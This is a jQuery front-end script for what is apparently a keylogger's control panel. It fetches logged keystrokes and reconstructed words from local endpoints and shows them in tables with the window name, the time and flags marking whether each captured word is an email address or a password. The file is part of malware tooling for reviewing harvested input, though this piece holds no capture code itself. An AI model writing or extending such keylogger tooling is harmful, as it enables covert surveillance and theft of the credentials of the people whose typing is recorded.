$(document).ready(function(){
    //when page loads, show the contents of the keylogger
    $('.container > #keyAll').show();
    showKeys();
    showWords();
      })

  // request and display all the keys collected
function showKeys() {
    $.ajax({
      url: "./showKeylog",
      method: "GET",
      dataType: 'json',
      success: showKeyTable,
      fail: console.log("Failed to show key log")
    });
}
  
function showKeyTable(keys){
    $('#keyAll > table > tbody').empty();
    keys.forEach((item) => {
        $('#keyAll > table > tbody').append(
            '<tr><td>'
            + item.datetime
            +'</td><td>'
            + item.isKeyDown
            +'</td><td>'
            + item.windowName
            +'</td><td>'
    	    + item.processedKey
    	    +'</td></tr>'
        )
    })
}
    
    // request and display all the words collected
function showWords() {
    $.ajax({
      url: "./showWordlog",
      method: "GET",
      dataType: 'json',
      success: showWordTable,
      fail: console.log("Failed to show word log")
    });
    console.log("help");
}
  
function showWordTable(words){
    $('#wordAll > table > tbody').empty();
    words.forEach((item) => {
        console.log(item)
        $('#wordAll > table > tbody').append(
            '<tr><td>'
            + item.datetime
            +'</td><td>'
            + item.windowName
            +'</td><td>'
            + item.processedWord
            +'</td><td>'
    	    + item.isEmail
    	    +'</td><td>'
    	    + item.isPassword
    	    +'</td></tr>'
        )
    })
}
